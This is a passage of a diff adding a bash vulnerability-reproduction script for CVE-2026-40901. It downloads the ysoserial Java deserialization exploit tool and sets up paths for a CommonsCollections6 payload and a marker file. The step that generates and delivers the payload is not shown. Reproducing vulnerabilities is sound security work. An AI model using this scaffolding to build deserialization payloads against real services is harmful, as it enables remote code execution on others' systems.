+SHARED_TMP="${PRUVA_REPRO_CACHE_DIR:-$ROOT/.pruva-repro-cache}/REPRO-2026-00167"
+mkdir -p "$SHARED_TMP"
+if [ -n "${PRUVA_REPRO_CACHE_DIR:-}" ]; then
+    YSOSERIAL_CACHE="${PRUVA_REPRO_CACHE_DIR}/ysoserial-master-snapshot-1"
+    mkdir -p "$YSOSERIAL_CACHE"
+    YSOSERIAL_JAR="$YSOSERIAL_CACHE/ysoserial.jar"
+    echo "[+] Using ysoserial cache: $YSOSERIAL_CACHE"
+else
+    YSOSERIAL_JAR="$SHARED_TMP/ysoserial.jar"
+fi
+PAYLOAD_BIN="$SHARED_TMP/payload-cc6-repro.bin"
+MARKER="$SHARED_TMP/pruva-cve-2026-40901.txt"
+
+download_ysoserial() {
+    local tmp="${YSOSERIAL_JAR}.tmp"
+    rm -f "$tmp"
+    if ! curl -fsSL --retry 3 --retry-delay 2 \
+        "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" \
+        -o "$tmp"; then
+        curl -fsSL --retry 3 --retry-delay 2 \
+            "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" \
+            -o "$tmp"
+    fi
+    if ! jar tf "$tmp" >/dev/null 2>&1; then
+        echo "[-] Downloaded ysoserial jar is invalid" >&2
+        rm -f "$tmp"
+        return 1
+    fi
+    mv "$tmp" "$YSOSERIAL_JAR"
+}
